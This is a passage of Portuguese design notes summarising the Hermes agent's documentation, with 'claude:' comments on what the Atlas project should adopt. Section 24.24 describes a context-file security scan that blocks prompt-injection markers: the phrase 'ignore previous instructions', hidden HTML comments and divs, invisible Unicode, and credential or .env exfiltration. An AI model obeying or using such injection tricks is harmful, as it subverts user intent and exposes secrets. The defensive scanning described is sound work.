| **Auto-detect** | GitHub Copilot tenta `COPILOT_GITHUB_TOKEN` → `GH_TOKEN` → `gh auth token` |

**Recomendações por caso:**

| Necessidade | Provider |
|---|---|
| Rápido + funcional | OpenRouter ou Nous Portal |
| Modelos locais zero-config | Ollama |
| Produção GPU | vLLM ou SGLang |
| Privacidade max | Ollama, vLLM |
| Mac sem GPU | Ollama, llama.cpp |
| Multi-provider routing | LiteLLM Proxy ou OpenRouter |
| Otimização de custo | ClawRouter ou OpenRouter `sort: "price"` |
| Modelos chineses | z.ai, Kimi, MiniMax, Xiaomi MiMo |

**Fallback model** (config.yaml):

```yaml
fallback_model:
  provider: openrouter
  model: anthropic/claude-sonnet-4
```

Dispara em rate limits, erros 5xx, auth failures. **Max 1× por session.**

**Detecção de context length em 9 níveis** (em ordem):
1. override `model.context_length` em config
2. cache local
3. endpoint `/v1/models` do provider
4. Anthropic API
5. OpenRouter
6. modelos.dev
7. fallback por família

**`context_length` ≠ `max_tokens`** — primeiro é total input+output, segundo é só output por resposta.

**Problemas conhecidos:**

| Provider | Issue | Workaround |
|---|---|---|
| Ollama | context default 4k (em <24GB VRAM) | `OLLAMA_CONTEXT_LENGTH` ou Modelfile |
| llama.cpp | sem `--jinja`, tool calling ignorado (vira JSON em texto) | iniciar com `--jinja` |
| GitHub Copilot | rejeita PATs clássicos `ghp_*` | usar `gho_`, `github_pat_`, ou app tokens |
| Bedrock | exige região | `AWS_REGION` env var |
| Google Gemini OAuth | restrições de conta em alguns users | aviso explícito antes |
| Anthropic Claude Max OAuth | só usa créditos de uso extra, não plano base | pré-condição de créditos |

> **claude:** **18+ providers via auth diversos** — Atlas hoje tem 2 (Claude/Codex CLI). Quando entrar Transport ABC (B14), priorizar (em ordem): **OpenRouter** (1 API key, acesso a 200+ modelos), **Anthropic API direto** (já tem familiaridade), **Bedrock** (Vitor já tem AWS). Não fazer todos os 18 de uma vez — escolher 3 e fazer bem.

> **claude:** **detecção de context_length em 9 níveis** é over-engineering para Atlas. Atlas adotar **3 níveis**: override config → endpoint `/v1/models` → fallback por família (lookup table). Cobre 95% dos casos.

> **claude:** **distinção `context_length` vs `max_tokens`** — Atlas precisa documentar e usar consistentemente. `AiTrace.metadata` deve ter ambos. Hoje só `latency_ms` é tracked. Adicionar em B3.

> **claude:** **fallback model max 1× por session** é regra anti-loop. Atlas adotar literalmente quando Transport ABC entrar.

> **claude:** **ClawRouter** alegando "74-100% economia" — alegação extraordinária. Provavelmente válida para tarefas que não precisam frontier model. Atlas pode considerar como provider auxiliar (B14) — direcionar `auxiliary.compression` e `auxiliary.session_search` pra ClawRouter, deixar main em Claude/Codex direto. Validar números antes de adotar.

> **claude:** **modelos chineses (z.ai, Kimi, MiniMax, Xiaomi MiMo)** — Hermes prioriza. Atlas com foco no operador único pode skip; só vale se Vitor for trabalhar com payload em chinês.

---

### 24.16 — Architecture revisitada (deeper notes)

**Pontos não cobertos antes (de leitura adicional):**

**Separação clean:** *"As diferenças de plataforma vivem no ponto de entrada, não no agente."* O `AIAgent` é único; CLI, Gateway, ACP, Batch Runner são wrappers que passam input → recebem output. Cada um encapsula transporte específico (terminal stdin/stdout, adapter de plataforma, JSON-RPC stdio para editores).

**`AIAgent` em `run_agent.py`** ~13.700 linhas (AGENTS.md disse "12k", documentação oficial disse "13.7k" — diff dentro de uma versão).

**Prompt caching strategy** (`prompt_caching.py`):
- Aplica breakpoints **Anthropic prefix cache**
- Builder agrega: SOUL.md + MEMORY.md + USER.md + skills + context files (.hermes.md, AGENTS.md) + tool guidance + model-specific
- **Prompt do sistema não muda durante conversa** — só ações explícitas (`/model`) quebram cache
- Compressão (`context_compressor.py`) sumariza turns intermediários quando contexto excede thresholds, preservando eficiência de tokens

**Tool registry sem dependências:**

```
tools/registry.py (no deps — base do grafo)
    ↑
tools/*.py (cada chama registry.register() em import)
    ↑
model_tools.py (imports tools/registry → trigger discovery)
    ↑
run_agent.py, cli.py, batch_runner.py, environments/
```

`model_tools.py` coleta schemas, verifica availability, despacha. Ferramentas de terminal abstraem 7 backends.

**Hooks vivem em gateway, não em AIAgent core.** `gateway/hooks.py` descobre e ativa extensions. `gateway/builtin_hooks/` é ponto de extensão sempre-registrado (vazio no shipped).

**Plugin discovery — 3 sources:**
- `~/.hermes/plugins/` (user-level)
- `.hermes/plugins/` (project-level)
- pip entry points

**Plugins single-select:** memory provider + context engine — apenas 1 ativo por vez.

**SessionDB:**
- SQLite + FTS5
- Lineage parent/child em compressões
- Isolamento por plataforma
- Atomic writes
- Recreated `AIAgent` from history (gateway pattern)

> **claude:** **separação CLI/Gateway/ACP/Batch como entry points + AIAgent único** é o padrão correto. Atlas tem essa propriedade já: `AiChatCommand` (REPL), `AtlasCliDevCommand` (one-shot wrapper), `AiWorker` (queue), `AtlasRuntimeCommand` (tool exec) — todos delegam pra `AiGatewayService`. **Confirma decisão arquitetural Atlas.**

> **claude:** **"prompt do sistema não muda durante conversa" como invariante de cache** é princípio que Atlas deve **declarar explicitamente**. Hoje `AiSessionStateService::updateForUserInput()` incrementa `version` a cada turn — se isso entra no system prompt, **invalida cache toda hora**. Atlas precisa separar: system prompt = imutável durante session (SOUL/skills/memory frozen snapshot); contexto dinâmico = vai como user message ou tool result (preserva cache). Discussion item para B5.

> **claude:** **tool registry sem dependências** — Atlas com Laravel container faz isso "naturalmente" via singleton bindings. Mas o pattern do Hermes (auto-register em import) é mais leve e explícito. Atlas pode adotar para skills (B5.bis): cada skill bundle auto-registra em `AiSkillBundleStore` quando descoberto.

> **claude:** **memory provider + context engine como single-select plugins** é decisão importante. Atlas deve ter **single-select** para esses tipos críticos — múltiplos providers ativos viraria conflito de fonte da verdade.

---

### 24.17 — Termux/Android (`/docs/getting-started/termux`)

7 etapas manual: update pacotes (git/python/clang/rust/ffmpeg) → clone → venv Python → `pip install -e '.[termux]'` → link binary → `hermes doctor`.

**`.[termux]` extras** exclui (intencional):
- voice transcription (`ctranslate2` sem Android)
- browser automation
- Docker isolation

**Limitações Android:** suspende background → gateway Telegram = "best-effort". Funciona: cron, terminal PTY, gateway Telegram, MCP, Honcho memory, ACP.

> **claude:** Atlas em PHP/Laravel sem ambição mobile **não copiar**. Útil saber que `.[termux]` é tier reduzido — Atlas pode ter "atlas-server-lite" sem deps pesadas (sem Postgres? só SQLite?), mas não é prioridade.

---

### 24.18 — Contributing (`/docs/developer-guide/contributing`)

**Stack dev:** Python 3.11+, Git --recurse-submodules, `uv` package manager, Node.js 20+ opcional.

```
git clone --recurse-submodules https://github.com/NousResearch/hermes-agent.git
uv venv venv --python 3.11
uv pip install -e ".[all,dev]"
pytest tests/ -v
```

**Padrões:** PEP 8 pragmático. Comentários explicam **intenção não-óbvia**, não restate código. Cross-platform: capturar `ImportError`/`NotImplementedError` em `termios`/`fcntl` (Unix-only). `pathlib.Path` always. Encoding fallback `latin-1`.

**Branch naming:** `fix/`, `feat/`, `docs/`, `test/`, `refactor/`, `chore/`.

**Conventional Commits:**
```
<type>(<scope>): <description>
```
Scopes: `cli`, `gateway`, `tools`, `skills`, `agent`, `security`.

Exemplo: `fix(security): prevent shell injection in sudo password piping`.

**Segurança em PR:**
- `shlex.quote()` em interpolação shell
- `os.path.realpath()` antes de access checks (resolve symlinks)
- Não logar secrets

**Prioridades:** critical bugs > cross-platform > security hardening > performance > skills > tools > docs.

> **claude:** **Conventional Commits + branch naming convention** — Atlas tem free-form hoje. Adotar é trabalho de 1 hora (atualizar `CONTRIBUTING.md`, hook commit-msg). Custo zero, ganho de auditoria de log futuro.

> **claude:** **`shlex.quote()` em shell + `realpath()` antes de access check** — Atlas com Symfony `Process` já protege contra injection (passes args como array). Mas check de **realpath antes de permission** é menos óbvio: garante que symlink não escapa do `allowed_roots` configurado. Atlas precisa adicionar em `AiPermissionEngine` se ainda não tem. Trabalho 1h.

> **claude:** **encoding fallback latin-1** — questionável. Atlas adotar **UTF-8 estrito + erro descritivo** ao invés. Latin-1 silencia erros que deveriam ser visíveis.

---

### 24.19 — Telegram adapter (`/docs/user-guide/messaging/telegram`)

**Setup:**
1. `@BotFather` → `/newbot` → token `123456789:ABCdefGH...`
2. ID numérico via `@userinfobot` ou `@get_id_bot`
3. `~/.hermes/.env`:
   ```
   TELEGRAM_BOT_TOKEN=...
   TELEGRAM_ALLOWED_USERS=seu_id
   ```
4. Ou `hermes gateway setup` (interativo)
5. BotFather `/setcommands` define menu visível

**Voice handling:**
- **In:** Voice messages auto-transcritas via STT (`local` faster-whisper / `groq` / `openai`), injetadas como texto
- **Out:** TTS entregue como voice bubble nativo
- Edge TTS default precisa `ffmpeg` (conversão Opus)

**Image/file upload:** Agent emite tag `MEDIA:/path/file` na resposta → gateway extrai e envia como anexo.

Extensões: PNG/JPG/GIF/WebP, MP3/WAV/OGG/M4A, MP4/MOV/WebM/MKV, PDF/TXT/MD/CSV/JSON/DOCX/XLSX/PPTX, ZIP/RAR/7Z/TAR/GZ.

Docker mount necessário se rodando em container:

```yaml
docker_volumes:
  - "/home/user/.hermes/cache/documents:/output"
```

**Topics (Bot API 9.4):**

DM topics (chats 1-a-1) — ativar Topics no cliente, config:

```yaml
platforms:
  telegram:
    extra:
      dm_topics:
      - chat_id: 12345
        topics:
        - name: "Website"
          icon_color: 9367192
          skill: nome-skill
```

Group topics (supergrupos forum mode):

```yaml
group_topics:
- chat_id: -1001234567890
  topics:
  - thread_id: 5
    skill: software-development
```

**Streaming via message edit** (Bot API 9.x).

**Privacy mode** (crítico em grupos): default vê só `/` commands + replies + admins. Desativar: BotFather `/mybots` → Bot Settings → Group Privacy → Turn off → **remover + re-adicionar bot**.

**Allowlists:** `TELEGRAM_ALLOWED_USERS` (DMs), `TELEGRAM_GROUP_ALLOWED_USERS` (só users em grupo), `TELEGRAM_GROUP_ALLOWED_CHATS` (qualquer membro). `*` = todos.

**Limitações:**
- Mensagem ~4000 chars max
- ~30 msg/seg rate limit
- DM topics requerem Bot API 9.4+
- Privacy mode bloqueia visibilidade default

> **claude:** **`MEDIA:/path/file` tag pattern para upload** é elegante. Atlas em B10 adotar literalmente — agent emite `MEDIA:/path` em resposta → gateway parser extrai e anexa antes de enviar. Trabalho ~1d.

> **claude:** **DM topics (chats 1-a-1 com tópicos isolados)** é UX excelente para múltiplos projetos no mesmo Telegram. Atlas em B10 v2 vale considerar — cada workspace Atlas pode ter tópico DM próprio com sessions isoladas.

> **claude:** **streaming via message edit** — Bot API 9.x suporta. Atlas Laravel adotar com `editMessageText` da Telegram API. Reduz latência percebida.

> **claude:** **3 níveis de allowlist Telegram** (DMs, grupo-users, grupo-membros) — Atlas adotar como hierarquia em B10. Simples e flexível.

> **claude:** **bot privacy mode + remove+re-add** é gotcha. Atlas em B10 deve documentar literalmente — operador esquece e bot fica "morto" em grupos.

---

### 24.20 — Skills Hub (`/docs/skills`)

**Catálogo:** 666 skills total, 16 categorias.

| Tier | Count |
|---|---|
| Builtin | 87 |
| Official | 58 |
| Community | 521 |

Top categorias: 74 software dev, 67 creative.

**Exemplos integrados:** GitHub, Google Workspace, Notion, art generation, diagramming, ML (TRL fine-tuning, vLLM serving, lm-eval-harness).

> **claude:** 666 skills é **escala que Atlas não precisa nem deve mirar**. Atlas é cirúrgico. Começar com 5-10 skills bundled de qualidade alta (versão Atlas do `comunicador-claro`, `dev-quality-gate`, `code-reviewer`, `decision-advisor`, `researcher-quick`, `provider-handoff`, `session-compaction`), e deixar `well-known/skills/index.json` opcional para o operador adicionar do ecossistema externo. **Não construir hub próprio.**

> **claude:** **587 (Builtin+Official) skills curadas pela Nous** é trabalho. Atlas com 1 operador pode adotar do hub Hermes via well-known compatibility — sem reinventar.

---

**Sitemap descoberto (URLs ainda não cobertas):**
- `/docs/getting-started/installation`
- `/docs/getting-started/learning-path`
- `/docs/user-guide/features/overview`
- `/docs/user-guide/features/tools`
- `/docs/user-guide/features/voice-mode`
- `/docs/user-guide/features/personality`
- `/docs/user-guide/features/context-files`
- `/docs/guides/tips`
- `/docs/guides/use-mcp-with-hermes`
- `/docs/guides/use-voice-mode-with-hermes`
- `/docs/reference/cli-commands`
- `/docs/reference/faq`
- `/docs/integrations/` (categoria, várias subpáginas)

---

### 24.21 — Tools and Toolsets (`/docs/user-guide/features/tools`)

**Conceito.** Tools = funções que estendem capacidades do agent. **Toolsets** = grupos lógicos ativáveis por plataforma.

**~9 categorias de toolsets:**

| Categoria | Membros | Função |
|---|---|---|
| Web/Search | `web_search`, `web_extract` | busca + extração de páginas |
| Terminal/Process/File | `read_file`, `patch`, terminal cmds | manipulação |
| Browser | `browser_navigate`, `browser_snapshot`, `browser_vision` | automação web |
| Mídia | `vision_analyze`, `image_generate`, `text_to_speech` | multimodal |
| Orchestration | `todo`, `clarify`, `code_execution`, `delegate_task` | planejamento |
| Memory | `memory`, `session_search` | persistência |
| Automação | `cronjob`, `messaging` | scheduled + delivery |
| Integrações | `homeassistant`, `mcp-*` (dinâmico per server), `rl`, `spotify`, `discord` | externos |
| Pré-config | `hermes-cli`, `hermes-telegram` | bundles por plataforma |

**Ativação:**

```bash
hermes chat --toolsets "web,terminal,skills"   # one-shot
hermes tools                                    # interactive, persiste em config
```

**Nous Portal Tool Gateway** — assinantes pagos têm web/image/TTS/automation **sem keys API separadas**. Ativável via `hermes model`.

**Terminal:** 7 backends (local, docker, ssh, singularity, modal, daytona, vercel_sandbox). Configurável via `terminal.backend` + `timeout` + `cwd`.

**Background processes:**

```python
process(action="list" | "poll" | "wait" | "log" | "kill")
# retorna session_id gerenciável
```

**Skills + plugins** estendem toolsets para custom functionality.

> **claude:** **`process(action="list|poll|wait|log|kill")` para background processes** é padrão valioso — Atlas em B12 (background tasks) deve adotar API similar. Em vez de exit-and-forget, manter handle pra `poll`/`kill`/`log` durante execução. Trabalho ~1d em B12.

> **claude:** **Nous Portal Tool Gateway** (toolset bundling com assinatura paga) é modelo de negócio. Atlas é pessoal — ignore.

> **claude:** Atlas com 12 tools fixos vs Hermes com ~50 tools em 9 toolsets — **Atlas é cirúrgico, mantém**. Adicionar tools em Atlas é via skill bundle (B5.bis), não como tool nativa.

---

### 24.22 — Voice Mode (`/docs/user-guide/features/voice-mode`)

**5 comandos:**

| Comando | Comportamento |
|---|---|
| `/voice on` | TTS responde só quando user manda áudio |
| `/voice tts` | TTS responde a todas mensagens |
| `/voice off` | text-only (default) |
| `/voice status` | configuração atual |
| `/voice join` / `/voice leave` | Discord voice channel |

**STT** (4 providers, prioridade auto: local > groq > openai):

| Provider | Modelo | Latência | Custo |
|---|---|---|---|
| **Local Whisper** | tiny/base/small/medium/large-v3 (~150 MB para `base`) | CPU/GPU dep. | grátis, offline |
| **Groq** | whisper-large-v3-turbo | ~0.5s | tier grátis |
| **OpenAI** | whisper-1 ou gpt-4o-transcribe | ~1-2s | pago |
| **Mistral** | listado em config | n/d | n/d |

**TTS** (8 providers):

| Provider | Latência | Custo |
|---|---|---|
| **Edge** | ~1s | grátis (precisa `ffmpeg` p/ Opus) |
| **ElevenLabs** | ~2s | pago, qualidade alta, múltiplos `voice_id` |
| **OpenAI** | ~1.5s | pago, voices: alloy/echo/fable/onyx/nova/shimmer |
| **NeuTTS** | CPU/GPU dep. | grátis local (espeak-ng) |
| **Minimax**, **Mistral**, **Gemini**, **xAI** | listados | n/d |

**Recording (CLI):**
- `Ctrl+B` start/stop
- Auto-stop após 3s de silêncio
- `max_recording_seconds: 120` (default)
- Silence detection **2-stage**: confirma fala (RMS > threshold por 0.3s) → dispara após 3s silêncio
- `silence_threshold: 200`, `silence_duration: 3.0`
- Beeps: 880Hz (start), 660Hz (end), `voice.beep_enabled: false` desativa

**Voice em messaging:**
- **Telegram** — voice memo → STT → texto → reply como voice bubble Opus/OGG
- **Discord text** — requer @mention em server channels (`DISCORD_REQUIRE_MENTION=false` override)
- **Discord voice channel** — bot connect, listen per-user, transcribe, process, speak back. Pausa listener durante TTS para evitar echo.

**Filtro anti-hallucination** — 26 frases conhecidas + padrões repetitivos. Ambientes ruidosos exigem ajuste de threshold.

**Dependências:** PortAudio (CLI), `ffmpeg` (conversão), libopus (Discord VC), espeak-ng (NeuTTS).

> **claude:** voice mode é **fora de escopo Atlas V2.0**. Vitor opera no terminal silencioso. Se algum dia entrar (B15+), Edge TTS gratuito + Whisper local é caminho zero-cost. Ignore por ora.

> **claude:** **Discord voice channel com pause-during-TTS para evitar echo** é detalhe ux esperto. Caso Atlas algum dia tenha voice, copiar literal.

---

### 24.23 — Personality + SOUL.md (`/docs/user-guide/features/personality`)

**SOUL.md** — identidade primária, **slot #1 do system prompt**, substitui identidade default builtin.

Localização: `~/.hermes/SOUL.md` (ou `$HERMES_HOME/SOUL.md`). **Auto-create se não existe; nunca sobrescreve user file.**

**Conteúdo SOUL.md** = baseline voice **duradouro**: tom, estilo comunicativo, franqueza, lidar com ambiguidade.

**Diferença SOUL.md ↔ AGENTS.md:**

| File | Escopo | Conteúdo |
|---|---|---|
| `SOUL.md` | global, persistente | identidade que segue você em qualquer projeto |
| `AGENTS.md` | projeto-específico | convenções, paths, fluxos temporários |

Regra: *"se deve seguir você em qualquer lugar, pertence a SOUL.md; se pertence a um projeto, vai para AGENTS.md"*.

**`/personality [name]`** — overlay **session-level** que altera/suplementa o prompt atual. Não modifica SOUL.md.

**14 personalities builtin:**
`helpful`, `concise`, `technical`, `creative`, `teacher`, `kawaii`, `catgirl`, `pirate`, `shakespeare`, `surfer`, `noir`, `uwu`, `philosopher`, `hype`.

**Custom em config.yaml:**

```yaml
agent:
  personalities:
    codereviewer: "You are a critical code reviewer..."
```

→ ativa via `/personality codereviewer`.

**Stack completo do system prompt:**
1. SOUL.md
2. Behavioral guidance
3. Memory (MEMORY.md + USER.md)
4. Skills
5. Context files (.hermes.md, AGENTS.md)
6. Timestamp
7. Formatting
8. Overlays opcionais (`/personality`)

> **claude:** **separação SOUL.md (global persistente) vs AGENTS.md (projeto temporário) é abstração que Atlas precisa formalizar.** Hoje Atlas tem master prompt embedded no código + skill `comunicador-claro` (output governor). Adotar pattern Hermes:
>   - `~/.atlas/SOUL.md` — voz persistente do Atlas (substitui parte do master prompt hardcoded)
>   - `<project>/AGENTS.md` — convenções de projeto (Atlas já carrega via context files no plano)
>   - `<project>/.atlas.md` — atlas-specific overrides
> 
> Trabalho em B5.bis: ~1 dia. Ganho: identidade do Atlas vira **editável pelo Vitor** sem tocar código.

> **claude:** **/personality overlays** — pular para Atlas. Atlas é cirúrgico, voz única. Adicionar 14 personas é antitético ao "luxo silencioso". Se Vitor quiser modos (debug/teaching/concise) que mudam tom, fazer via skill bundle, não personality overlay.

---

### 24.24 — Context Files (`/docs/user-guide/features/context-files`)

**6 tipos escaneados automaticamente:**

| File | Prioridade | Função |
|---|---|---|
| `.hermes.md` / `HERMES.md` | **MAX** | instruções de projeto (atlas-native) |
| `AGENTS.md` | alta | convenções, arquitetura, fluxos |
| `CLAUDE.md` | alta | compat com Claude Code |
| `.cursorrules` | média | IDE Cursor |
| `.cursor/rules/*.mdc` | média | módulos Cursor |
| `SOUL.md` | sempre carrega (separado) | identidade global |

**Discovery hierarchy** (project files): `.hermes.md` → `AGENTS.md` → `CLAUDE.md` → `.cursorrules` — **apenas o primeiro é carregado** (first-match-wins).

**Localização por tipo:**
- Project files: do `cwd` até root git (ascendente)
- `AGENTS.md` aninhados: descobertos **progressivamente** durante a sessão (quando agent navega `app/Auth/`, carrega `app/Auth/AGENTS.md` se existir)
- `SOUL.md`: exclusivamente de `HERMES_HOME` ou `~/.hermes/`
- `.cursorrules`: apenas no root do projeto

**Limites:**

| Onde | Limite |
|---|---|
| Cada arquivo top-level | **20.000 chars (~7.000 tokens)** |
| AGENTS.md aninhado | **8.000 chars** |

**Truncagem** (quando excede):
- 70% do início
- 20% do final
- 10% marcador no meio indicando exclusão

**Stack de montagem no system prompt:**
1. Conteúdo do project file
2. `.cursorrules` se aplicável
3. `SOUL.md` injetado direto (sem wrapping)

Header: `# Project Context`.

**Security scan antes de inclusão.** Bloqueia:
- `"ignore previous instructions"` (case-insensitive)
- `"do not tell the user"`
- HTML comment hidden: `<!-- ignore instructions -->`
- Display: `<div style="display:none">...`
- Exfiltração de credentials, acesso a `.env`/secrets
- Unicode invisível (zero-width spaces, bidirectional overrides)

Bloqueado: `[BLOCKED: AGENTS.md contained potential prompt injection]`.

**Sem mecanismo de desabilitação explícita.** Exclui arquivo ou usa nome fora da hierarquia.

> **claude:** **6 tipos com hierarquia first-match-wins é UX excelente.** Atlas adotar literalmente em B5.bis:
>   - `.atlas.md` / `ATLAS.md` (max priority — atlas-native)
>   - `AGENTS.md` (compat universal)
>   - `CLAUDE.md` (compat com Claude Code)
>   - `.cursorrules` (compat Cursor)
>   - `~/.atlas/SOUL.md` (always loaded)
> 
> Tabela de hierarquia + scanner = ~2 dias trabalho. Abre interop com Cursor/Claude Code/Hermes/Codex sem custo adicional.

> **claude:** **20K chars / 8K subdir limites** são números concretos que Atlas adopt literal. `AiPromptBuilder` aplicar truncagem 70/20/10 (preserva preâmbulo + estado recente, descarta meio) é mais inteligente que cortar tail.

> **claude:** **`AGENTS.md` aninhado descoberto progressivamente** — quando agent abre `app/Services/Ai/`, carrega `app/Services/Ai/AGENTS.md` se existir. **Padrão poderoso** para monorepo. Atlas em B5.bis adotar — modificação no `AiContextPackBuilder` para escanear ancestros do path tocado.

> **claude:** **Header `# Project Context`** — Atlas adotar literal. Padronização ajuda LLM identificar bloco vs noise.

> **claude:** **Security scan exato (com regex e Unicode invisível)** — Atlas em B5.bis copiar lista. Esta página é **referência canônica** para o scan que Atlas precisa fazer. Trabalho ~1d.

> **claude:** **sem mecanismo de disable** é fraqueza. Atlas pode adicionar `metadata.atlas.context_files_disabled: ["CLAUDE.md"]` em config — útil quando project tem `CLAUDE.md` legacy não-aplicável.

---

### 24.25 — Reference: CLI commands (`/docs/reference/cli-commands`)

**26 subcomandos `hermes`:**

| Cmd | Função |
|---|---|
| `chat` | diálogo (interactive ou `-q` one-shot) |
| `model` | seletor interativo provider+model |
| `gateway` | run/manage messaging gateway |
| `setup` | wizard interativo |
| `auth` | OAuth + credentials |
| `skills` | navegar/install/publish/audit |
| `config` | ver/edit/migrate config |
| `sessions` | navegar/export/clean/rename |
| `cron` | scheduler |
| `webhook` | subscriptions dinâmicas |
| `pairing` | aprovar/revogar codes DM |
| `profile` | múltiplas instâncias isoladas |
| `mcp` | MCP servers |
| `tools` | toolsets habilitados por plataforma |
| `plugins` | plugins + context engines |
| `memory` | provider externo de memory |
| `logs` | view/follow/filter logs |
| `doctor` | diagnostic |
| `backup` | ZIP do `~/.hermes/` |
| `import` | restaurar de ZIP |
| `dump` | summary copy-paste para suporte |
| `insights` | analytics |
| `curator` | manutenção de skills em background |
| `acp` | servidor ACP (editor integration) |
| `update` | git pull + reinstall deps + skills sync |
| `version` | info versão |

**11 flags globais:**

| Flag | Função |
|---|---|
| `-V` / `--version` | versão |
| `-p <name>` / `--profile` | profile selector |
| `-r <session>` / `--resume` | retomar por ID/title |
| `-c [name]` / `--continue` | retomar mais recente |
| `-w` / `--worktree` | git worktree isolado |
| `--yolo` | bypass approval prompts (exceto hardline) |
| `--pass-session-id` | injeta ID no system prompt |
| `--ignore-user-config` | skip `~/.hermes/config.yaml` |
| `--ignore-rules` | skip auto-injection de AGENTS.md/SOUL.md |
| `--tui` | TUI Ink em vez de CLI clássico |
| `--dev` | com `--tui`: roda fontes TS via `tsx` |

**`hermes -z <prompt>`** — **one-shot puro**: só resposta final, sem banner/decoração. Ideal para shell scripts e CI. Env vars override flags:
- `HERMES_INFERENCE_MODEL`
- `HERMES_INFERENCE_PROVIDER`

**`hermes chat` opções principais:**

```
-q, --query "..."         # one-shot
-m, --model <id>          # override modelo
-t, --toolsets <csv>      # ativa toolsets
--provider <p>            # forçar provider
-s, --skills <name>       # pre-load skill
-v, --verbose             # detailed
-Q, --quiet               # programmático (no banner/spinner)
--image <path>            # anexar imagem local
--checkpoints             # checkpoint antes de destrutivo
--max-turns 90            # iterações tool-calling
```

**`hermes setup`:**

```
hermes setup [section] [--quick|--non-interactive|--reset|--reconfigure]
# sections: model, tui, terminal, gateway, tools, agent
```

**`hermes profile`:**

```
hermes profile list
hermes profile create <name> [--clone | --clone-all]
hermes profile use <name>            # default persistente
hermes profile delete <name> [-y]
hermes profile export <name> -o <file>      # .tar.gz
hermes profile import <file>
hermes profile alias <name> --name <wrapper>
```

**`hermes logs`:**

```
hermes logs [agent|errors|gateway]
  --lines N           # default 50
  -f, --follow        # tail -f
  --level LEVEL       # DEBUG/INFO/WARNING/ERROR/CRITICAL
  --session ID
  --since 30m|1h|2d
  --component gateway|agent|tools|cli|cron
```

**`hermes webhook subscribe`:**

```
--prompt <template>       # {dot.notation} substituições
--events <csv>            # ex: issues,pull_request
--skills <csv>            # carregar pra agente executor
--deliver <target>        # log (default), telegram, discord, slack, github_comment
--deliver-chat-id <id>
```

Subscriptions persistem em `~/.hermes/webhook_subscriptions.json`.

**`hermes mcp`:**

```
hermes mcp serve [-v]            # rodar como MCP server
hermes mcp add <name> --url <URL> | --command <cmd>
hermes mcp list / remove / test / configure
```

**Exit codes:**

| Code | Significado |
|---|---|
| 0 | sucesso |
| 1 | erro install/post-install |
| 2 | uncommitted changes (em update) |

> **claude:** **`hermes -z <prompt>` puro one-shot** é UX que Atlas precisa em B0/B1. Atlas hoje sempre printa banner+spinner. Adicionar `atlas -z "X"` que só responde texto final, sem decoração, ideal para `cron` e `bash` scripts. Trabalho 0.5d.

> **claude:** **`HERMES_INFERENCE_MODEL` / `HERMES_INFERENCE_PROVIDER` env vars override** é padrão portátil. Atlas adopt: `ATLAS_INFERENCE_MODEL`/`ATLAS_INFERENCE_PROVIDER` em `.env` ou export inline. Trabalho 1h.

> **claude:** **`hermes profile export -o file.tar.gz`** + **import** — backup e migração entre máquinas. Atlas precisa equivalente para `~/.atlas/` quando expandir além do dev workspace. Trabalho 1d em B8.

> **claude:** **`hermes logs --component gateway|agent|tools|cli|cron --since 1h --level WARNING`** — granularidade impressionante. Atlas com Laravel `monolog` channels já tem base; só falta wrapper CLI. Trabalho 0.5d em B3 (após tool events implementados).

> **claude:** **`hermes webhook subscribe --prompt "{dot.notation}"` com substituições** é padrão de templating poderoso. Atlas em B10+ pode adotar — webhook → template render → agent prompt. Casa com payload de Telegram/Discord/etc.

> **claude:** **`hermes dump`** — resumo copy-paste para suporte. Atlas pode adotar como `atlas dump` que copia config redacted + log tail + version + last failed trace. Útil para issue reports. Trabalho 0.5d.

---

### 24.26 — FAQ (`/docs/reference/faq`)

**Setup gotchas:**
- "command not found" pós-install → `source ~/.bashrc` ou nova shell
- Python 3.11+ required (`brew install python@3.12` ou `apt install python3.12`)
- Tools como `node`/`nvm`/`pyenv` não detectados → `terminal.shell_init_files: [~/.zshrc, ~/.nvm/nvm.sh]` em config

**Auth:**
- Chave API errada → `hermes config show` valida
- 429 errors → upgrade plan ou alternar provider via fallback chain

**Performance:**
- Slow responses → modelo menor (`llama-3.1-8b`), reduzir toolsets
- Token usage alto → `/compress` regular
- Context excedido → comprimir ou nova session

**Gateway:**
- Bot não responde → `hermes gateway status` + allowlist
- Logs em `~/.hermes/logs/gateway.log`
- WSL systemd instável → `hermes gateway run` foreground (ou tmux)
- macOS launchd PATH mínimo → re-run `hermes gateway install` para recapturar
- Windows WSL: Task Scheduler com `wsl -d Ubuntu -- bash -lc 'hermes gateway run'`

**MCP:**
- Tools sumiram → `/reload-mcp`

**Voice:**
- `.[all]` indisponível Android (faster-whisper → ctranslate2 sem wheels)
- `.[termux]` é alternativa testada

**Memory vs Skills (distinção crítica):**

| | Memory | Skills |
|---|---|---|
| Armazena | **fatos** sobre você/projetos | **procedimentos** passo a passo |
| Recuperação | by relevance | when triggered by similar task |
| Persistência | cross-session | cross-session |
| Tamanho | ~1300 tokens fixos | ilimitado por skill |

**Update:**
- `hermes update` puxa código + reinstala deps **uma vez globalmente** + sincroniza skills para todos profiles automaticamente

**Custos:**
- Hermes é open-source MIT — você paga só API do provider
- Modelos locais (Ollama, vLLM, llama.cpp) = grátis

> **claude:** **distinção memory (fatos) vs skills (procedimentos)** é definição mais clara que vi. Atlas precisa adotar literal:
>   - `MemoryDelta` (B5) = fatos com evidência (claim+confidence+valid_until)
>   - skill bundle (B5.bis) = procedimento (when_to_use + procedure + gotchas)
> 
> Confusão antes era misturar. **Esta página resolve a confusão de design.**

> **claude:** **`shell_init_files`** (carregar `~/.zshrc`, `~/.nvm/nvm.sh` para detectar nvm/pyenv) — Atlas adopt em B11 (remote backend). Trabalho 0.5d.

> **claude:** **`hermes update` sincroniza skills para todos profiles automaticamente** — design clean. Atlas com 1 operador não precisa, mas o pattern (update central + sync) vale lembrar.

---

### 24.27 — Tips (`/docs/guides/tips`)

**Prompt patterns:**
- Específico > genérico: caminhos, erros, comportamento esperado
- Frontload context — reduz iterações
- AGENTS.md = "cérebro do projeto" para instruções recorrentes

**CLI ergonomics:**
- `Alt+Enter` multilinha sem enviar
- Detecção auto de paste bloqueia envios linha-a-linha
- `Ctrl+C` interrompe + redireciona (até combina mensagens)
- `Ctrl+V` cola imagens
- `hermes -c` retoma sessão recente preservando histórico
- Tab-completion em `/`

**Memory vs Skills (uso prático):**
- Memory para fatos sobre ambiente, preferências, aprendizados
- Skills para fluxos de 5+ passos reutilizáveis
- "limpe anotações antigas" quando memory enche
- `/usage` (consumo) e `/insights` (padrões)

**Cost optimization:**
- Cache prefix economiza quando system prompt estável → não mudar mid-session
- `/compress` em sessões longas
- `delegate_task` paraleliza sem inflar conversa principal
- `execute_code` para batch (rename, transform) é mais barato que comandos individuais
- Modelo certo: frontier para reasoning complexo; rápido para formatação

**Messaging best practices:**
